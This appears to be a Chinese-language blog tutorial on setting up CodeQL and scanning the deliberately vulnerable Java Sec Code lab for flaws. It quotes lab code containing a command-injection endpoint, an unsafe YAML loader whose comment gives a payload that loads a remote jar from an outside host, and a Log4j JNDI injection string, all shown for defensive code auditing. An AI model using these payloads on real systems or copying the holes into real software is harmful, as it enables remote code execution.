---
created: 2024-10-16T06:21:00+00:00
categories:
  - 技术研究
tags:
  - 代码审计
updated: 2023-08-25T00:00:00+00:00
date: 2023-08-15T00:00:00+00:00
slug: codeql-preliminary-study
title: CodeQL静态代码分析之初探篇
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/55a5941a-5da3-47b7-8768-4957be153f6d/IMG_3240.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055824Z&X-Amz-Expires=3600&X-Amz-Signature=c3d8ec69e0d56f97a92967745c5121b0bc362b3e9a230405f9689cbbe760a94e&X-Amz-SignedHeaders=host&x-id=GetObject
id: 121906e1-7468-813c-a903-efc98b777d4d
---

## CodeQL 介绍

CodeQL 是一款功能强大的静态代码分析工具，旨在帮助开发人员和安全研究人员自动查找代码错误、检查代码质量以及识别漏洞，并协助手动代码审查。目前支持的语言包括 C/C++、C#、Go、Java、Kotlin、JavaScript、Python、Ruby、TypeScript 和 Swift。

它的前身是牛津大学衍生公司 Semmle 基于牛津大学团队十多年的研究成果推出的一个在线代码扫描平台 LGTM.com，GitHub 于 2019 年收购了 Semmle 公司，以利用该公司的 CodeQL 分析技术对自家数量庞大的代码库进行安全扫描，并于 2020 年底对外开放了 CodeQL，但未开源。

CodeQL 通过创建程序的结构化信息集合数据库，对代码进行语义分析，这意味着它不仅可以进行简单的模式匹配，还能够理解代码中的行为和关系。同时，CodeQL 还提供一种表达式、声明式逻辑查询语言 QL，可用于编写复杂的、自定义的代码查询，类似处理数据一样去处理代码，从而通过数据流和污点分析来发现代码库中特定类型的漏洞或安全风险。

## 环境准备

在使用 CodeQL 前，先下载安装 CodeQL CLI 命令行工具、CodeQL 标准库以及 Visual Studio Code CodeQL 扩展，当然 Visual Studio Code 也是不可少的，因为后续的 CodeQL 查询是在 Visual Studio Code 中进行的。除此之外，还要准备一个带有丰富漏洞的靶场环境。如果系统是 ARM 架构的 macOS，则还需要额外安装依赖。

### 额外依赖安装

对于 ARM 架构的 macOS，需额外安装两个依赖，通过如下命令安装。虽然 CodeQL 目前支持 ARM 架构的 macOS，但对于 ARM 架构的 Linux 和 Windows 系统，截止本文发布之时还未得到 CodeQL 的支持。

```bash
xcode-select --install && softwareupdate --install-rosetta
```

### CodeQL CLI

CodeQL CLI 是一个独立的命令行工具，其主要目的是生成代码库的数据库表示形式，即 CodeQL 数据库，当数据库生成后，就可通过交互式查询来查询它，或者运行一系列查询以生成一组 SARIF 格式的结果。

通过其 GitHub Releases 页（https://github.com/github/codeql-cli-binaries/releases ）下载最新版本的压缩包，下载后将其解压。同时，在家目录下创建一个 CodeQL 文件夹，将刚才解压后的整个文件夹放置其中。

```bash
mkdir ~/CodeQL/
mv ~/Downloads/codeql ~/CodeQL
```

以及配置环境变量并重载。

```bash
echo '\n# CodeQL\nexport PATH="$HOME/CodeQL/codeql:$PATH"' >> ~/.zshrc
source ~/.zshrc
```

现在，在系统任何地方都可以直接运行 codeql 命令，若出现如下结果就意味着 CodeQL CLI 配置成功。

```bash
codeql
Usage: codeql <command> <argument>...
Create and query CodeQL databases, or work with the QL language.

GitHub makes this program freely available for the analysis of open-source software and certain other uses, but it
is not itself free software. Type codeql --license to see the license terms.

......
```

在将来，建议保持 codeql-cli-binaries 为最新版本。

### CodeQL 查询库

GitHub 中的 codeql 仓库（https://github.com/github/codeql ）包含所有受支持语言的 CodeQL 分析所需的查询和库，可将其直接下载至本地文件夹以供使用。

不过，GitHub 提供了一种在 VS Code 中更方便地使用查询库的方式。使用如下命令递归克隆 vscode-codeql-starter 仓库至本地~/CodeQL 文件夹，这同时也会将 codeql 仓库克隆至 ql 文件夹中。

```bash
cd ~/CodeQL && git clone --recursive https://github.com/github/vscode-codeql-starter
```

进入 vscode-codeql-starter 中，可以看到 ql 文件夹包含各种语言的查询库。在将来，建议不定期地执行`git submodule update --remote`命令以更新查询库。

```bash
cd vscode-codeql-starter && ls ql
BUILD.bazel         MODULE.bazel          config       docs        python
CODEOWNERS          README.md             conftest.py  go          ql
CODE_OF_CONDUCT.md  WORKSPACE.bazel       cpp          java        ruby
CONTRIBUTING.md     change-notes          csharp       javascript  shared
LICENSE             codeql-workspace.yml  defs.bzl     misc        swift
```

将 vscode-codeql-starter 克隆至本地后，每次都可以使用 VS Code 将其作为一个工作区打开。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e9b19df6-b417-4961-954b-68db154f1c6c/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=c01c4fbb89379a432f515f9d452e543d6215e0024c8002d1d627f49830e896e2&X-Amz-SignedHeaders=host&x-id=GetObject)

未来自己编写的 CodeQL 查询，都可以存放在这些目录中。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/b9344d98-0468-4578-801f-21bc9017e5a5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=0d0e2498f9c1da2fc54c96f70d5510b62641bf9bc5409370c460b8d93b5456fe&X-Amz-SignedHeaders=host&x-id=GetObject)

在`vscode-codeql-starter/ql/java/ql/src/Security/CWE/`文件夹中以.ql 作为后缀名的就是 GitHub 官方维护的 Java 程序常见漏洞的 CodeQL 查询，可直接拿来使用。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/da044af6-0127-4ccf-bb80-ab00df3f05ce/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=e5cacb32ca0734e25b6c13e49b541364de9029121111ce57bcd63ad9962d64ec&X-Amz-SignedHeaders=host&x-id=GetObject)

更直观地，可在如下网站（https://codeql.github.com/codeql-query-help/java-cwe/ ）看到受支持的全部 CWE（通用弱点枚举）。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/01687fc1-4dcd-47d1-a316-44126448aece/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=b9019dd491ac0807758909276d59125ccff652666e46043ca9cd1158019c8cf7&X-Amz-SignedHeaders=host&x-id=GetObject)

### VS Code 扩展

对于 VS Code 相关扩展的安装，可直接在 VS Code 的扩展中搜索 CodeQL 关键词或通过如下链接进行安装。

[https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql](https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/0415a354-2d02-4830-b44f-71d7c442a5b0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=975beaa5d1f7906d6fa1b60e582cf591a3e20bde323be49c60a90f63325ed85e&X-Amz-SignedHeaders=host&x-id=GetObject)

除 CodeQL 扩展外，建议再安装一个 SARIF Viewer 扩展，用于查看 SARIF 日志文件。SARIF 全称静态分析结果交换格式，是一种定义输出文件格式的 OASIS 标准，SARIF 标准用于简化静态分析工具分享其结果的方式。

[https://marketplace.visualstudio.com/items?itemName=MS-SarifVSCode.sarif-viewer](https://marketplace.visualstudio.com/items?itemName=MS-SarifVSCode.sarif-viewer)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/b5beacbb-af04-4a9c-aef1-da29d28df184/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=a33838a84727ae50278a3668c0616ddf7170acb8192da7cb4066b84a8ecb3296&X-Amz-SignedHeaders=host&x-id=GetObject)

### 漏洞靶场环境

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c4d31486-c51f-480e-9170-aa3846e72fdc/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=de543c87b3821a1b9117659bd2632f83e045b260e6d734c59fbd9fe7a2ae2a1a&X-Amz-SignedHeaders=host&x-id=GetObject)

对于漏洞靶场环境，本文将会采用 Java Sec Code 这一含有丰富漏洞类型的靶场环境，在~/CodeQL 下创建 vulns 文件夹，将这个靶场克隆至其中。

```bash
cd ~/CodeQL && mkdir vulns && cd vulns
git clone https://github.com/JoyChou93/java-sec-code/
```

## 数据库创建

CodeQL 数据库是代码库的关系表示，其中包含不同源代码元素（如类和函数）的信息，在创建数据库的过程中会提取代码库中每一个源文件的单一关系表示，并将每个元素放入单独的数据表中。

对于编译型语言，提取是通过监控正常的编译过程来实现的，每次调用编译器处理源文件时，都会复制一份该文件，并收集源代码的所有相关信息，包括抽象语法树的语法数据，以及名称绑定和类型信息的语义数据。

由于 Java 是编译型语言，CodeQL 需要调用所需的构建系统来生成数据库，因此构建方法须提供给 CodeQL，也就是`-c`接收的参数值`mvn clean install`。而对于解释型语言，如 JavaScript、Python 则无需添加该参数。最终通过如下命令来创建数据库。

```bash
codeql database create ./jscdb -s ./java-sec-code -l java -c "mvn clean install -DskipTests"
```

相关参数的解释如下。

- `create`：要创建的 CodeQL 数据库的路径。
- `-s`：源代码目录。
- `-l`：将用于分析的语言指定为 Java。
- `-c`：对于编译型语言，构建命令将调用编译器对源代码进行分析。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/df330f7c-1aa1-44b0-8bae-739403d7a1da/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=2b976f95d69c610bf69c72450bb88533ec9b6b60a207ecd54984165569380510&X-Amz-SignedHeaders=host&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f4a7ead7-79f2-43c9-9ff0-68dab636ac76/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=9af25f34d9e597621732613ee6f0fb30dad518ac9639f0cc36faec736cf5c07b&X-Amz-SignedHeaders=host&x-id=GetObject)

如上图，出现 Successfully created database 就意味着数据库创建成功了，成功创建后的数据库中包含代码的完整分层表示，包括抽象语法树、数据流图和控制流图。查看数据库文件夹，可看到关系数据（分析所需的）和源代码压缩包（创建数据库时创建的源代码副本）都存在其中，将来会用于显示分析结果。

```bash
$ ls jscdb
baseline-info.json  codeql-database.yml db-java  diagnostic  log  src.zip
```

## 数据库分析

### 利用 CLI 分析数据库

在数据库生成后，就可利用先前安装的 CodeQL CLI 工具来运行一系列查询，以生成一组 SARIF 格式或 CSV 格式的结果。

首先是 SARIF 格式，命令如下，等待分析完毕，便会在当前目录下生成 jsc-scan-result.sarif 文件。

```bash
codeql database analyze jscdb --format=sarif-latest --output=jsc-scan-result.sarif
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/2703363d-c30d-43f8-bee4-0364fd9af79f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=b0df1ffb68fb5b79ec18d572eb5c2be6619fa8300542e0c57f1cff96381b4e2c&X-Amz-SignedHeaders=host&x-id=GetObject)

接着，通过 VS Code 打开 vscode-codeql-starter 工作区，并在 CodeQL 插件中添加 jscdb 数据库文件夹。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d19b7bf7-95b4-4019-9016-5ea5e63a60ff/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=bef4232c1723bc80e38917976ebfafe37cb55359c9c0cab7cbc31970859d4d94&X-Amz-SignedHeaders=host&x-id=GetObject)

然后，再用 VS Code 打开 jsc-scan-result.sarif 文件。如下图所见，此前安装的 SARIF Viewer 扩展起到作用了，这样分析 SARIF 文件就会变得很方便。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/43b4472f-d219-4ff7-bc30-8f551474b69f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=855cbc0f6459cc233f667973806a6244025e41fb4beca52dd5b113690bacf0bf&X-Amz-SignedHeaders=host&x-id=GetObject)

上图所展示的是一个命令注入漏洞示例，漏洞代码如下。

```java
@GetMapping("/runtime/exec")
public String CommandExec(String cmd) {
    Runtime run = Runtime.getRuntime();
    StringBuilder sb = new StringBuilder();

    try {
        Process p = run.exec(cmd);
        BufferedInputStream in = new BufferedInputStream(p.getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String tmpStr;

        while ((tmpStr = inBr.readLine()) != null) {
            sb.append(tmpStr);
        }

        if (p.waitFor() != 0) {
            if (p.exitValue() == 1)
                return "Command exec failed!!";
        }

        inBr.close();
        in.close();
    } catch (Exception e) {
        return e.toString();
    }
    return sb.toString();
}
```

继续往下看，可发现对于使用了 SafeConstructor 的这种安全写法，并未发生误报的情况。

```java
/**
 * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
 * yaml-payload.jar: https://github.com/artsploit/yaml-payload
 *
 * @param content payloads
 */
@GetMapping("/vuln/yarm")
public void yarm(String content) {
    Yaml y = new Yaml();
    y.load(content);
}

@GetMapping("/sec/yarm")
public void secYarm(String content) {
    Yaml y = new Yaml(new SafeConstructor());
    y.load(content);
}
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/af727074-a4a4-4cb5-8adc-cecf6c0e1128/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=2410a909fd8b61e9e072df39633a25f6323dc4f210ef2f18ea102a956123b308&X-Amz-SignedHeaders=host&x-id=GetObject)

以上说完了 SARIF 格式，除 SARIF 格式外，还可将分析结果导出成 CSV 格式的文件，利用如下命令。

```bash
codeql database analyze jscdb --format=csv --output=jsc-scan-result.csv
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ed8f7fad-d977-4ee9-8dec-0d8a790091f8/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=6b80334a2ab08e7c889031c544eec1752bccca75f66d406505fd851bcb691c16&X-Amz-SignedHeaders=host&x-id=GetObject)

在 Excel 中打开 jsc-scan-result.csv 文件，可看到如下结果，但这种方式就不如上面的那么直观。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/0a69188e-c53f-48ff-b4f5-ac1828140162/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=301c91f3eccbabf449deadd493587f45dc3e7962e572f8b9e1d9d994a0a469b3&X-Amz-SignedHeaders=host&x-id=GetObject)

### 在 VS Code 中查询分析

除了利用 CLI 工具对数据库进行分析外，还可在 VS Code 中执行 CodeQL 查询分析。例如如下，运行 Log4J LDAP JNDI 注入查询。

```java
@RestController
public class Log4j {

    private static final Logger logger = LogManager.getLogger("Log4j");

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j")
    public String log4j(String token) {
        logger.error(token);
        return token;
    }

    public static void main(String[] args) {
        String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
        logger.error(poc);
    }

}
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d3970c49-15f0-4097-88c2-6d6c3a93dc4c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45GO43JXI4%2F20241118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241118T055825Z&X-Amz-Expires=3600&X-Amz-Signature=6b44a33e857e09f1f3fa9ed502a090bea9f9c70c4c02f5aca3f615b97649f87d&X-Amz-SignedHeaders=host&x-id=GetObject)

不过，这种方式在数量上有限制，单次最多只可运行 20 个查询。

## 参考

- https://github.blog/2022-08-15-the-next-step-for-lgtm-com-github-code-scanning/
- https://github.blog/2023-03-31-codeql-zero-to-hero-part-1-the-fundamentals-of-static-analysis-for-vulnerability-research/
- https://github.blog/2023-06-15-codeql-zero-to-hero-part-2-getting-started-with-codeql/
- https://docs.github.com/en/code-security/codeql-cli
- https://codeql.github.com/docs/
- https://docs.bearer.com/explanations/workflow/#advanced-concepts
- https://www.youtube.com/watch?v=y_-pIbsr7jc
